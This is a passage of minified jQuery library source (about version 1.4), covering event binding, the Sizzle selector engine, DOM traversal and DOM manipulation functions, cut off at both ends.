B;return c.event.trigger(a,b,d)}}};c.event.special.change={filters:{focusout:Z,beforedeactivate:Z,click:function(a){var b=a.target,d=b.type;if(d==="radio"||d==="checkbox"||b.nodeName.toLowerCase()==="select")return Z.call(this,a)},keydown:function(a){var b=a.target,d=b.type;if(a.keyCode===13&&b.nodeName.toLowerCase()!=="textarea"||a.keyCode===32&&(d==="checkbox"||d==="radio")||d==="select-multiple")return Z.call(this,a)},beforeactivate:function(a){a=a.target;c.data(a,"_change_data",xa(a))}},setup:function(){if(this.type===
"file")return false;for(var a in V)c.event.add(this,a+".specialChange",V[a]);return ia.test(this.nodeName)},teardown:function(){c.event.remove(this,".specialChange");return ia.test(this.nodeName)}};V=c.event.special.change.filters;V.focus=V.beforeactivate}t.addEventListener&&c.each({focus:"focusin",blur:"focusout"},function(a,b){function d(e){e=c.event.fix(e);e.type=b;return c.event.trigger(e,null,e.target)}c.event.special[b]={setup:function(){ua[b]++===0&&t.addEventListener(a,d,true)},teardown:function(){--ua[b]===
0&&t.removeEventListener(a,d,true)}}});c.each(["bind","one"],function(a,b){c.fn[b]=function(d,e,f){if(typeof d==="object"){for(var h in d)this[b](h,e,d[h],f);return this}if(c.isFunction(e)||e===false){f=e;e=B}var l=b==="one"?c.proxy(f,function(o){c(this).unbind(o,l);return f.apply(this,arguments)}):f;if(d==="unload"&&b!=="one")this.one(d,e,f);else{h=0;for(var k=this.length;h<k;h++)c.event.add(this[h],d,l,e)}return this}});c.fn.extend({unbind:function(a,b){if(typeof a==="object"&&!a.preventDefault)for(var d in a)this.unbind(d,
a[d]);else{d=0;for(var e=this.length;d<e;d++)c.event.remove(this[d],a,b)}return this},delegate:function(a,b,d,e){return this.live(b,d,e,a)},undelegate:function(a,b,d){return arguments.length===0?this.unbind("live"):this.die(b,null,d,a)},trigger:function(a,b){return this.each(function(){c.event.trigger(a,b,this)})},triggerHandler:function(a,b){if(this[0]){var d=c.Event(a);d.preventDefault();d.stopPropagation();c.event.trigger(d,b,this[0]);return d.result}},toggle:function(a){for(var b=arguments,d=
1;d<b.length;)c.proxy(a,b[d++]);return this.click(c.proxy(a,function(e){var f=(c.data(this,"lastToggle"+a.guid)||0)%d;c.data(this,"lastToggle"+a.guid,f+1);e.preventDefault();return b[f].apply(this,arguments)||false}))},hover:function(a,b){return this.mouseenter(a).mouseleave(b||a)}});var ya={focus:"focusin",blur:"focusout",mouseenter:"mouseover",mouseleave:"mouseout"};c.each(["live","die"],function(a,b){c.fn[b]=function(d,e,f,h){var l,k=0,o,x,r=h||this.selector;h=h?this:c(this.context);if(typeof d===
"object"&&!d.preventDefault){for(l in d)h[b](l,e,d[l],r);return this}if(c.isFunction(e)){f=e;e=B}for(d=(d||"").split(" ");(l=d[k++])!=null;){o=X.exec(l);x="";if(o){x=o[0];l=l.replace(X,"")}if(l==="hover")d.push("mouseenter"+x,"mouseleave"+x);else{o=l;if(l==="focus"||l==="blur"){d.push(ya[l]+x);l+=x}else l=(ya[l]||l)+x;if(b==="live"){x=0;for(var A=h.length;x<A;x++)c.event.add(h[x],"live."+Y(l,r),{data:e,selector:r,handler:f,origType:l,origHandler:f,preType:o})}else h.unbind("live."+Y(l,r),f)}}return this}});
c.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error".split(" "),function(a,b){c.fn[b]=function(d,e){if(e==null){e=d;d=null}return arguments.length>0?this.bind(b,d,e):this.trigger(b)};if(c.attrFn)c.attrFn[b]=true});E.attachEvent&&!E.addEventListener&&c(E).bind("unload",function(){for(var a in c.cache)if(c.cache[a].handle)try{c.event.remove(c.cache[a].handle.elem)}catch(b){}});
(function(){function a(g,i,n,m,p,q){p=0;for(var u=m.length;p<u;p++){var y=m[p];if(y){var F=false;for(y=y[g];y;){if(y.sizcache===n){F=m[y.sizset];break}if(y.nodeType===1&&!q){y.sizcache=n;y.sizset=p}if(y.nodeName.toLowerCase()===i){F=y;break}y=y[g]}m[p]=F}}}function b(g,i,n,m,p,q){p=0;for(var u=m.length;p<u;p++){var y=m[p];if(y){var F=false;for(y=y[g];y;){if(y.sizcache===n){F=m[y.sizset];break}if(y.nodeType===1){if(!q){y.sizcache=n;y.sizset=p}if(typeof i!=="string"){if(y===i){F=true;break}}else if(k.filter(i,
[y]).length>0){F=y;break}}y=y[g]}m[p]=F}}}var d=/((?:\((?:\([^()]+\)|[^()]+)+\)|\[(?:\[[^\[\]]*\]|['"][^'"]*['"]|[^\[\]'"]+)+\]|\\.|[^ >+~,(\[\\]+)+|[>+~])(\s*,\s*)?((?:.|\r|\n)*)/g,e=0,f=Object.prototype.toString,h=false,l=true;[0,0].sort(function(){l=false;return 0});var k=function(g,i,n,m){n=n||[];var p=i=i||t;if(i.nodeType!==1&&i.nodeType!==9)return[];if(!g||typeof g!=="string")return n;var q,u,y,F,M,N=true,O=k.isXML(i),D=[],R=g;do{d.exec("");if(q=d.exec(R)){R=q[3];D.push(q[1]);if(q[2]){F=q[3];
break}}}while(q);if(D.length>1&&x.exec(g))if(D.length===2&&o.relative[D[0]])u=L(D[0]+D[1],i);else for(u=o.relative[D[0]]?[i]:k(D.shift(),i);D.length;){g=D.shift();if(o.relative[g])g+=D.shift();u=L(g,u)}else{if(!m&&D.length>1&&i.nodeType===9&&!O&&o.match.ID.test(D[0])&&!o.match.ID.test(D[D.length-1])){q=k.find(D.shift(),i,O);i=q.expr?k.filter(q.expr,q.set)[0]:q.set[0]}if(i){q=m?{expr:D.pop(),set:C(m)}:k.find(D.pop(),D.length===1&&(D[0]==="~"||D[0]==="+")&&i.parentNode?i.parentNode:i,O);u=q.expr?k.filter(q.expr,
q.set):q.set;if(D.length>0)y=C(u);else N=false;for(;D.length;){q=M=D.pop();if(o.relative[M])q=D.pop();else M="";if(q==null)q=i;o.relative[M](y,q,O)}}else y=[]}y||(y=u);y||k.error(M||g);if(f.call(y)==="[object Array]")if(N)if(i&&i.nodeType===1)for(g=0;y[g]!=null;g++){if(y[g]&&(y[g]===true||y[g].nodeType===1&&k.contains(i,y[g])))n.push(u[g])}else for(g=0;y[g]!=null;g++)y[g]&&y[g].nodeType===1&&n.push(u[g]);else n.push.apply(n,y);else C(y,n);if(F){k(F,p,n,m);k.uniqueSort(n)}return n};k.uniqueSort=function(g){if(w){h=
l;g.sort(w);if(h)for(var i=1;i<g.length;i++)g[i]===g[i-1]&&g.splice(i--,1)}return g};k.matches=function(g,i){return k(g,null,null,i)};k.matchesSelector=function(g,i){return k(i,null,null,[g]).length>0};k.find=function(g,i,n){var m;if(!g)return[];for(var p=0,q=o.order.length;p<q;p++){var u,y=o.order[p];if(u=o.leftMatch[y].exec(g)){var F=u[1];u.splice(1,1);if(F.substr(F.length-1)!=="\\"){u[1]=(u[1]||"").replace(/\\/g,"");m=o.find[y](u,i,n);if(m!=null){g=g.replace(o.match[y],"");break}}}}m||(m=i.getElementsByTagName("*"));
return{set:m,expr:g}};k.filter=function(g,i,n,m){for(var p,q,u=g,y=[],F=i,M=i&&i[0]&&k.isXML(i[0]);g&&i.length;){for(var N in o.filter)if((p=o.leftMatch[N].exec(g))!=null&&p[2]){var O,D,R=o.filter[N];D=p[1];q=false;p.splice(1,1);if(D.substr(D.length-1)!=="\\"){if(F===y)y=[];if(o.preFilter[N])if(p=o.preFilter[N](p,F,n,y,m,M)){if(p===true)continue}else q=O=true;if(p)for(var j=0;(D=F[j])!=null;j++)if(D){O=R(D,p,j,F);var s=m^!!O;if(n&&O!=null)if(s)q=true;else F[j]=false;else if(s){y.push(D);q=true}}if(O!==
B){n||(F=y);g=g.replace(o.match[N],"");if(!q)return[];break}}}if(g===u)if(q==null)k.error(g);else break;u=g}return F};k.error=function(g){throw"Syntax error, unrecognized expression: "+g;};var o=k.selectors={order:["ID","NAME","TAG"],match:{ID:/#((?:[\w\u00c0-\uFFFF\-]|\\.)+)/,CLASS:/\.((?:[\w\u00c0-\uFFFF\-]|\\.)+)/,NAME:/\[name=['"]*((?:[\w\u00c0-\uFFFF\-]|\\.)+)['"]*\]/,ATTR:/\[\s*((?:[\w\u00c0-\uFFFF\-]|\\.)+)\s*(?:(\S?=)\s*(['"]*)(.*?)\3|)\s*\]/,TAG:/^((?:[\w\u00c0-\uFFFF\*\-]|\\.)+)/,CHILD:/:(only|nth|last|first)-child(?:\((even|odd|[\dn+\-]*)\))?/,
POS:/:(nth|eq|gt|lt|first|last|even|odd)(?:\((\d*)\))?(?=[^\-]|$)/,PSEUDO:/:((?:[\w\u00c0-\uFFFF\-]|\\.)+)(?:\((['"]?)((?:\([^\)]+\)|[^\(\)]*)+)\2\))?/},leftMatch:{},attrMap:{"class":"className","for":"htmlFor"},attrHandle:{href:function(g){return g.getAttribute("href")}},relative:{"+":function(g,i){var n=typeof i==="string",m=n&&!/\W/.test(i);n=n&&!m;if(m)i=i.toLowerCase();m=0;for(var p=g.length,q;m<p;m++)if(q=g[m]){for(;(q=q.previousSibling)&&q.nodeType!==1;);g[m]=n||q&&q.nodeName.toLowerCase()===
i?q||false:q===i}n&&k.filter(i,g,true)},">":function(g,i){var n,m=typeof i==="string",p=0,q=g.length;if(m&&!/\W/.test(i))for(i=i.toLowerCase();p<q;p++){if(n=g[p]){n=n.parentNode;g[p]=n.nodeName.toLowerCase()===i?n:false}}else{for(;p<q;p++)if(n=g[p])g[p]=m?n.parentNode:n.parentNode===i;m&&k.filter(i,g,true)}},"":function(g,i,n){var m,p=e++,q=b;if(typeof i==="string"&&!/\W/.test(i)){m=i=i.toLowerCase();q=a}q("parentNode",i,p,g,m,n)},"~":function(g,i,n){var m,p=e++,q=b;if(typeof i==="string"&&!/\W/.test(i)){m=
i=i.toLowerCase();q=a}q("previousSibling",i,p,g,m,n)}},find:{ID:function(g,i,n){if(typeof i.getElementById!=="undefined"&&!n)return(g=i.getElementById(g[1]))&&g.parentNode?[g]:[]},NAME:function(g,i){if(typeof i.getElementsByName!=="undefined"){for(var n=[],m=i.getElementsByName(g[1]),p=0,q=m.length;p<q;p++)m[p].getAttribute("name")===g[1]&&n.push(m[p]);return n.length===0?null:n}},TAG:function(g,i){return i.getElementsByTagName(g[1])}},preFilter:{CLASS:function(g,i,n,m,p,q){g=" "+g[1].replace(/\\/g,
"")+" ";if(q)return g;q=0;for(var u;(u=i[q])!=null;q++)if(u)if(p^(u.className&&(" "+u.className+" ").replace(/[\t\n]/g," ").indexOf(g)>=0))n||m.push(u);else if(n)i[q]=false;return false},ID:function(g){return g[1].replace(/\\/g,"")},TAG:function(g){return g[1].toLowerCase()},CHILD:function(g){if(g[1]==="nth"){var i=/(-?)(\d*)n((?:\+|-)?\d*)/.exec(g[2]==="even"&&"2n"||g[2]==="odd"&&"2n+1"||!/\D/.test(g[2])&&"0n+"+g[2]||g[2]);g[2]=i[1]+(i[2]||1)-0;g[3]=i[3]-0}g[0]=e++;return g},ATTR:function(g,i,n,
m,p,q){i=g[1].replace(/\\/g,"");if(!q&&o.attrMap[i])g[1]=o.attrMap[i];if(g[2]==="~=")g[4]=" "+g[4]+" ";return g},PSEUDO:function(g,i,n,m,p){if(g[1]==="not")if((d.exec(g[3])||"").length>1||/^\w/.test(g[3]))g[3]=k(g[3],null,null,i);else{g=k.filter(g[3],i,n,true^p);n||m.push.apply(m,g);return false}else if(o.match.POS.test(g[0])||o.match.CHILD.test(g[0]))return true;return g},POS:function(g){g.unshift(true);return g}},filters:{enabled:function(g){return g.disabled===false&&g.type!=="hidden"},disabled:function(g){return g.disabled===
true},checked:function(g){return g.checked===true},selected:function(g){return g.selected===true},parent:function(g){return!!g.firstChild},empty:function(g){return!g.firstChild},has:function(g,i,n){return!!k(n[3],g).length},header:function(g){return/h\d/i.test(g.nodeName)},text:function(g){return"text"===g.type},radio:function(g){return"radio"===g.type},checkbox:function(g){return"checkbox"===g.type},file:function(g){return"file"===g.type},password:function(g){return"password"===g.type},submit:function(g){return"submit"===
g.type},image:function(g){return"image"===g.type},reset:function(g){return"reset"===g.type},button:function(g){return"button"===g.type||g.nodeName.toLowerCase()==="button"},input:function(g){return/input|select|textarea|button/i.test(g.nodeName)}},setFilters:{first:function(g,i){return i===0},last:function(g,i,n,m){return i===m.length-1},even:function(g,i){return i%2===0},odd:function(g,i){return i%2===1},lt:function(g,i,n){return i<n[3]-0},gt:function(g,i,n){return i>n[3]-0},nth:function(g,i,n){return n[3]-
0===i},eq:function(g,i,n){return n[3]-0===i}},filter:{PSEUDO:function(g,i,n,m){var p=i[1],q=o.filters[p];if(q)return q(g,n,i,m);else if(p==="contains")return(g.textContent||g.innerText||k.getText([g])||"").indexOf(i[3])>=0;else if(p==="not"){i=i[3];n=0;for(m=i.length;n<m;n++)if(i[n]===g)return false;return true}else k.error("Syntax error, unrecognized expression: "+p)},CHILD:function(g,i){var n=i[1],m=g;switch(n){case "only":case "first":for(;m=m.previousSibling;)if(m.nodeType===1)return false;if(n===
"first")return true;m=g;case "last":for(;m=m.nextSibling;)if(m.nodeType===1)return false;return true;case "nth":n=i[2];var p=i[3];if(n===1&&p===0)return true;var q=i[0],u=g.parentNode;if(u&&(u.sizcache!==q||!g.nodeIndex)){var y=0;for(m=u.firstChild;m;m=m.nextSibling)if(m.nodeType===1)m.nodeIndex=++y;u.sizcache=q}m=g.nodeIndex-p;return n===0?m===0:m%n===0&&m/n>=0}},ID:function(g,i){return g.nodeType===1&&g.getAttribute("id")===i},TAG:function(g,i){return i==="*"&&g.nodeType===1||g.nodeName.toLowerCase()===
i},CLASS:function(g,i){return(" "+(g.className||g.getAttribute("class"))+" ").indexOf(i)>-1},ATTR:function(g,i){var n=i[1];n=o.attrHandle[n]?o.attrHandle[n](g):g[n]!=null?g[n]:g.getAttribute(n);var m=n+"",p=i[2],q=i[4];return n==null?p==="!=":p==="="?m===q:p==="*="?m.indexOf(q)>=0:p==="~="?(" "+m+" ").indexOf(q)>=0:!q?m&&n!==false:p==="!="?m!==q:p==="^="?m.indexOf(q)===0:p==="$="?m.substr(m.length-q.length)===q:p==="|="?m===q||m.substr(0,q.length+1)===q+"-":false},POS:function(g,i,n,m){var p=o.setFilters[i[2]];
if(p)return p(g,n,i,m)}}},x=o.match.POS,r=function(g,i){return"\\"+(i-0+1)},A;for(A in o.match){o.match[A]=RegExp(o.match[A].source+/(?![^\[]*\])(?![^\(]*\))/.source);o.leftMatch[A]=RegExp(/(^(?:.|\r|\n)*?)/.source+o.match[A].source.replace(/\\(\d+)/g,r))}var C=function(g,i){g=Array.prototype.slice.call(g,0);if(i){i.push.apply(i,g);return i}return g};try{Array.prototype.slice.call(t.documentElement.childNodes,0)}catch(J){C=function(g,i){var n=0,m=i||[];if(f.call(g)==="[object Array]")Array.prototype.push.apply(m,
g);else if(typeof g.length==="number")for(var p=g.length;n<p;n++)m.push(g[n]);else for(;g[n];n++)m.push(g[n]);return m}}var w,I;if(t.documentElement.compareDocumentPosition)w=function(g,i){if(g===i){h=true;return 0}if(!g.compareDocumentPosition||!i.compareDocumentPosition)return g.compareDocumentPosition?-1:1;return g.compareDocumentPosition(i)&4?-1:1};else{w=function(g,i){var n,m,p=[],q=[];n=g.parentNode;m=i.parentNode;var u=n;if(g===i){h=true;return 0}else if(n===m)return I(g,i);else if(n){if(!m)return 1}else return-1;
for(;u;){p.unshift(u);u=u.parentNode}for(u=m;u;){q.unshift(u);u=u.parentNode}n=p.length;m=q.length;for(u=0;u<n&&u<m;u++)if(p[u]!==q[u])return I(p[u],q[u]);return u===n?I(g,q[u],-1):I(p[u],i,1)};I=function(g,i,n){if(g===i)return n;for(g=g.nextSibling;g;){if(g===i)return-1;g=g.nextSibling}return 1}}k.getText=function(g){for(var i="",n,m=0;g[m];m++){n=g[m];if(n.nodeType===3||n.nodeType===4)i+=n.nodeValue;else if(n.nodeType!==8)i+=k.getText(n.childNodes)}return i};(function(){var g=t.createElement("div"),
i="script"+(new Date).getTime(),n=t.documentElement;g.innerHTML="<a name='"+i+"'/>";n.insertBefore(g,n.firstChild);if(t.getElementById(i)){o.find.ID=function(m,p,q){if(typeof p.getElementById!=="undefined"&&!q)return(p=p.getElementById(m[1]))?p.id===m[1]||typeof p.getAttributeNode!=="undefined"&&p.getAttributeNode("id").nodeValue===m[1]?[p]:B:[]};o.filter.ID=function(m,p){var q=typeof m.getAttributeNode!=="undefined"&&m.getAttributeNode("id");return m.nodeType===1&&q&&q.nodeValue===p}}n.removeChild(g);
n=g=null})();(function(){var g=t.createElement("div");g.appendChild(t.createComment(""));if(g.getElementsByTagName("*").length>0)o.find.TAG=function(i,n){var m=n.getElementsByTagName(i[1]);if(i[1]==="*"){for(var p=[],q=0;m[q];q++)m[q].nodeType===1&&p.push(m[q]);m=p}return m};g.innerHTML="<a href='#'></a>";if(g.firstChild&&typeof g.firstChild.getAttribute!=="undefined"&&g.firstChild.getAttribute("href")!=="#")o.attrHandle.href=function(i){return i.getAttribute("href",2)};g=null})();t.querySelectorAll&&
function(){var g=k,i=t.createElement("div");i.innerHTML="<p class='TEST'></p>";if(!(i.querySelectorAll&&i.querySelectorAll(".TEST").length===0)){k=function(m,p,q,u){p=p||t;m=m.replace(/\=\s*([^'"\]]*)\s*\]/g,"='$1']");if(!u&&!k.isXML(p))if(p.nodeType===9)try{return C(p.querySelectorAll(m),q)}catch(y){}else if(p.nodeType===1&&p.nodeName.toLowerCase()!=="object"){var F=p.getAttribute("id"),M=F||"__sizzle__";F||p.setAttribute("id",M);try{return C(p.querySelectorAll("#"+M+" "+m),q)}catch(N){}finally{F||
p.removeAttribute("id")}}return g(m,p,q,u)};for(var n in g)k[n]=g[n];i=null}}();(function(){var g=t.documentElement,i=g.matchesSelector||g.mozMatchesSelector||g.webkitMatchesSelector||g.msMatchesSelector,n=false;try{i.call(t.documentElement,"[test!='']:sizzle")}catch(m){n=true}if(i)k.matchesSelector=function(p,q){q=q.replace(/\=\s*([^'"\]]*)\s*\]/g,"='$1']");if(!k.isXML(p))try{if(n||!o.match.PSEUDO.test(q)&&!/!=/.test(q))return i.call(p,q)}catch(u){}return k(q,null,null,[p]).length>0}})();(function(){var g=
t.createElement("div");g.innerHTML="<div class='test e'></div><div class='test'></div>";if(!(!g.getElementsByClassName||g.getElementsByClassName("e").length===0)){g.lastChild.className="e";if(g.getElementsByClassName("e").length!==1){o.order.splice(1,0,"CLASS");o.find.CLASS=function(i,n,m){if(typeof n.getElementsByClassName!=="undefined"&&!m)return n.getElementsByClassName(i[1])};g=null}}})();k.contains=t.documentElement.contains?function(g,i){return g!==i&&(g.contains?g.contains(i):true)}:t.documentElement.compareDocumentPosition?
function(g,i){return!!(g.compareDocumentPosition(i)&16)}:function(){return false};k.isXML=function(g){return(g=(g?g.ownerDocument||g:0).documentElement)?g.nodeName!=="HTML":false};var L=function(g,i){for(var n,m=[],p="",q=i.nodeType?[i]:i;n=o.match.PSEUDO.exec(g);){p+=n[0];g=g.replace(o.match.PSEUDO,"")}g=o.relative[g]?g+"*":g;n=0;for(var u=q.length;n<u;n++)k(g,q[n],m);return k.filter(p,m)};c.find=k;c.expr=k.selectors;c.expr[":"]=c.expr.filters;c.unique=k.uniqueSort;c.text=k.getText;c.isXMLDoc=k.isXML;
c.contains=k.contains})();var Za=/Until$/,$a=/^(?:parents|prevUntil|prevAll)/,ab=/,/,Na=/^.[^:#\[\.,]*$/,bb=Array.prototype.slice,cb=c.expr.match.POS;c.fn.extend({find:function(a){for(var b=this.pushStack("","find",a),d=0,e=0,f=this.length;e<f;e++){d=b.length;c.find(a,this[e],b);if(e>0)for(var h=d;h<b.length;h++)for(var l=0;l<d;l++)if(b[l]===b[h]){b.splice(h--,1);break}}return b},has:function(a){var b=c(a);return this.filter(function(){for(var d=0,e=b.length;d<e;d++)if(c.contains(this,b[d]))return true})},
not:function(a){return this.pushStack(ma(this,a,false),"not",a)},filter:function(a){return this.pushStack(ma(this,a,true),"filter",a)},is:function(a){return!!a&&c.filter(a,this).length>0},closest:function(a,b){var d=[],e,f,h=this[0];if(c.isArray(a)){var l,k={},o=1;if(h&&a.length){e=0;for(f=a.length;e<f;e++){l=a[e];k[l]||(k[l]=c.expr.match.POS.test(l)?c(l,b||this.context):l)}for(;h&&h.ownerDocument&&h!==b;){for(l in k){e=k[l];if(e.jquery?e.index(h)>-1:c(h).is(e))d.push({selector:l,elem:h,level:o})}h=
h.parentNode;o++}}return d}l=cb.test(a)?c(a,b||this.context):null;e=0;for(f=this.length;e<f;e++)for(h=this[e];h;)if(l?l.index(h)>-1:c.find.matchesSelector(h,a)){d.push(h);break}else{h=h.parentNode;if(!h||!h.ownerDocument||h===b)break}d=d.length>1?c.unique(d):d;return this.pushStack(d,"closest",a)},index:function(a){if(!a||typeof a==="string")return c.inArray(this[0],a?c(a):this.parent().children());return c.inArray(a.jquery?a[0]:a,this)},add:function(a,b){var d=typeof a==="string"?c(a,b||this.context):
c.makeArray(a),e=c.merge(this.get(),d);return this.pushStack(!d[0]||!d[0].parentNode||d[0].parentNode.nodeType===11||!e[0]||!e[0].parentNode||e[0].parentNode.nodeType===11?e:c.unique(e))},andSelf:function(){return this.add(this.prevObject)}});c.each({parent:function(a){return(a=a.parentNode)&&a.nodeType!==11?a:null},parents:function(a){return c.dir(a,"parentNode")},parentsUntil:function(a,b,d){return c.dir(a,"parentNode",d)},next:function(a){return c.nth(a,2,"nextSibling")},prev:function(a){return c.nth(a,
2,"previousSibling")},nextAll:function(a){return c.dir(a,"nextSibling")},prevAll:function(a){return c.dir(a,"previousSibling")},nextUntil:function(a,b,d){return c.dir(a,"nextSibling",d)},prevUntil:function(a,b,d){return c.dir(a,"previousSibling",d)},siblings:function(a){return c.sibling(a.parentNode.firstChild,a)},children:function(a){return c.sibling(a.firstChild)},contents:function(a){return c.nodeName(a,"iframe")?a.contentDocument||a.contentWindow.document:c.makeArray(a.childNodes)}},function(a,
b){c.fn[a]=function(d,e){var f=c.map(this,b,d);Za.test(a)||(e=d);if(e&&typeof e==="string")f=c.filter(e,f);f=this.length>1?c.unique(f):f;if((this.length>1||ab.test(e))&&$a.test(a))f=f.reverse();return this.pushStack(f,a,bb.call(arguments).join(","))}});c.extend({filter:function(a,b,d){if(d)a=":not("+a+")";return b.length===1?c.find.matchesSelector(b[0],a)?[b[0]]:[]:c.find.matches(a,b)},dir:function(a,b,d){var e=[];for(a=a[b];a&&a.nodeType!==9&&(d===B||a.nodeType!==1||!c(a).is(d));){a.nodeType===1&&
e.push(a);a=a[b]}return e},nth:function(a,b,d){b=b||1;for(var e=0;a;a=a[d])if(a.nodeType===1&&++e===b)break;return a},sibling:function(a,b){for(var d=[];a;a=a.nextSibling)a.nodeType===1&&a!==b&&d.push(a);return d}});var za=/ jQuery\d+="(?:\d+|null)"/g,$=/^\s+/,Aa=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/ig,Ba=/<([\w:]+)/,db=/<tbody/i,eb=/<|&#?\w+;/,Ca=/<(?:script|object|embed|option|style)/i,Da=/checked\s*(?:[^=]|=\s*.checked.)/i,fb=/\=([^="'>\s]+\/)>/g,P={option:[1,
"<select multiple='multiple'>","</select>"],legend:[1,"<fieldset>","</fieldset>"],thead:[1,"<table>","</table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],col:[2,"<table><tbody></tbody><colgroup>","</colgroup></table>"],area:[1,"<map>","</map>"],_default:[0,"",""]};P.optgroup=P.option;P.tbody=P.tfoot=P.colgroup=P.caption=P.thead;P.th=P.td;if(!c.support.htmlSerialize)P._default=[1,"div<div>","</div>"];c.fn.extend({text:function(a){if(c.isFunction(a))return this.each(function(b){var d=
c(this);d.text(a.call(this,b,d.text()))});if(typeof a!=="object"&&a!==B)return this.empty().append((this[0]&&this[0].ownerDocument||t).createTextNode(a));return c.text(this)},wrapAll:function(a){if(c.isFunction(a))return this.each(function(d){c(this).wrapAll(a.call(this,d))});if(this[0]){var b=c(a,this[0].ownerDocument).eq(0).clone(true);this[0].parentNode&&b.insertBefore(this[0]);b.map(function(){for(var d=this;d.firstChild&&d.firstChild.nodeType===1;)d=d.firstChild;return d}).append(this)}return this},
wrapInner:function(a){if(c.isFunction(a))return this.each(function(b){c(this).wrapInner(a.call(this,b))});return this.each(function(){var b=c(this),d=b.contents();d.length?d.wrapAll(a):b.append(a)})},wrap:function(a){return this.each(function(){c(this).wrapAll(a)})},unwrap:function(){return this.parent().each(function(){c.nodeName(this,"body")||c(this).replaceWith(this.childNodes)}).end()},append:function(){return this.domManip(arguments,true,function(a){this.nodeType===1&&this.appendChild(a)})},
prepend:function(){return this.domManip(arguments,true,function(a){this.nodeType===1&&this.insertBefore(a,this.firstChild)})},before:function(){if(this[0]&&this[0].parentNode)return this.domManip(arguments,false,function(b){this.parentNode.insertBefore(b,this)});else if(arguments.length){var a=c(arguments[0]);a.push.apply(a,this.toArray());return this.pushStack(a,"before",arguments)}},after:function(){if(this[0]&&this[0].parentNode)return this.domManip(arguments,false,function(b){this.parentNode.insertBefore(b,
this.nextSibling)});else if(arguments.length){var a=this.pushStack(this,"after",arguments);a.push.apply(a,c(arguments[0]).toArray());return a}},remove:function(a,b){for(var d=0,e;(e=this[d])!=null;d++)if(!a||c.filter(a,[e]).length){if(!b&&e.nodeType===1){c.cleanData(e.getElementsByTagName("*"));c.cleanData([e])}e.parentNode&&e.parentNode.removeChild(e)}return this},empty:function(){for(var a=0,b;(b=this[a])!=null;a++)for(b.nodeType===1&&c.cleanData(b.getElementsByTagName("*"));b.firstChild;)b.removeChild(b.firstChild);
return this},clone:function(a){var b=this.map(function(){if(!c.support.noCloneEvent&&!c.isXMLDoc(this)){var d=this.outerHTML,e=this.ownerDocument;if(!d){d=e.createElement("div");d.appendChild(this.cloneNode(true));d=d.innerHTML}return c.clean([d.replace(za,"").replace(fb,'="$1">').replace($,"")],e)[0]}else return this.cloneNode(true)});if(a===true){na(this,b);na(this.find("*"),b.find("*"))}return b},html:function(a){if(a===B)return this[0]&&this[0].nodeType===1?this[0].innerHTML.replace(za,""):null;
else if(typeof a==="string"&&!Ca.test(a)&&(c.support.leadingWhitespace||!$.test(a))&&!P[(Ba.exec(a)||["",""])[1].toLowerCase()]){a=a.replace(Aa,"<$1></$2>");try{for(var b=0,d=this.length;b<d;b++)if(this[b].nodeType===1){c.cleanData(this[b].getElementsByTagName("*"));this[b].innerHTML=a}}catch(e){this.empty().append(a)}}else c.isFunction(a)?this.each(function(f){var h=c(this);h.html(a.call(this,f,h.html()))}):this.empty().append(a);return this},replaceWith:function(a){if(this[0]&&this[0].parentNode){if(c.isFunction(a))return this.each(function(b){var d=
c(this),e=d.html();d.replaceWith(a.call(this,b,e))});if(typeof a!=="string")a=c(a).detach();return this.each(function(){var b=this.nextSibling,d=this.parentNode;c(this).remove();b?c(b).before(a):c(d).append(a)})}else return this.pushStack(c(c.isFunction(a)?a():a),"replaceWith",a)},detach:function(a){return this.remove(a,true)},domManip:function(a,b,d){var e,f,h,l=a[0],k=[];if(!c.support.checkClone&&arguments.length===3&&typeof l==="string"&&Da.test(l))return this.each(function(){c(this).domManip(a,
b,d,true)});if(c.isFunction(l))return this.each(function(x){var r=c(this);a[0]=l.call(this,x,b?r.html():B);r.domManip(a,b,d)});if(this[0]){e=l&&l.parentNode;e=c.support.parentNode&&e&&e.nodeType===11&&e.childNodes.length===this.length?{fragment:e}:c.buildFragment(a,this,k);h=e.fragment;if(f=h.childNodes.length===1?h=h.firstChild:h.firstChild){b=b&&c.nodeName(f,"tr");f=0;for(var o=this.length;f<o;f++)d.call(b?c.nodeName(this[f],"table")?this[f].getElementsByTagName("tbody")[0]||this[f].appendChild(this[f].ownerDocument.createElement("tbody")):
this[f]:this[f],f>0||e.cacheable||this.length>1?h.cloneNode(true):h)}k.length&&c.each(k,Oa)}return this}});c.buildFragment=function(a,b,d){var e,f,h;b=b&&b[0]?b[0].ownerDocument||b[0]:t;if(a.length===1&&typeof a[0]==="string"&&a[0].length<512&&b===t&&!Ca.test(a[0])&&(c.support.checkClone||!Da.test(a[0]))){f=true;if(h=c.fragments[a[0]])if(h!==1)e=h}if(!e){e=b.createDocumentFragment();c.clean(a,b,e,d)}if(f)c.fragments[a[0]]=h?e:1;return{fragment:e,cacheable:f}};c.fragments={};c.each({appendTo:"append",
prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},function(a,b){c.fn[a]=function(d){var e=[];d=c(d);var f=this.length===1&&this[0].parentNode;if(f&&f.nodeType===11&&f.childNodes.length===1&&d.length===1){d[b](this[0]);return this}else{f=0;for(var h=d.length;f<h;f++){var l=(f>0?this.clone(true):this).get();c(d[f])[b](l);e=e.concat(l)}return this.pushStack(e,a,d.selector)}}});c.extend({clean:function(a,b,d,e){b=b||t;if(typeof b.createElement==="undefined")b=b.ownerDocument||
b[0]&&b[0].ownerDocument||t;for(var f=[],h=0,l;(l=a[h])!=null;h++){if(typeof l==="number")l+="";if(l){if(typeof l==="string"&&!eb.test(l))l=b.createTextNode(l);else if(typeof l==="string"){l=l.replace(Aa,"<$1></$2>");var k=(Ba.exec(l)||["",""])[1].toLowerCase(),o=P[k]||P._default,x=o[0],r=b.createElement("div");for(r.innerHTML=o[1]+l+o[2];x--;)r=r.lastChild;if(!c.support.tbody){x=db.test(l);k=k==="table"&&!x?r.firstChild&&r.firstChild.childNodes:o[1]==="<table>"&&!x?r.childNodes:[];for(o=k.length-
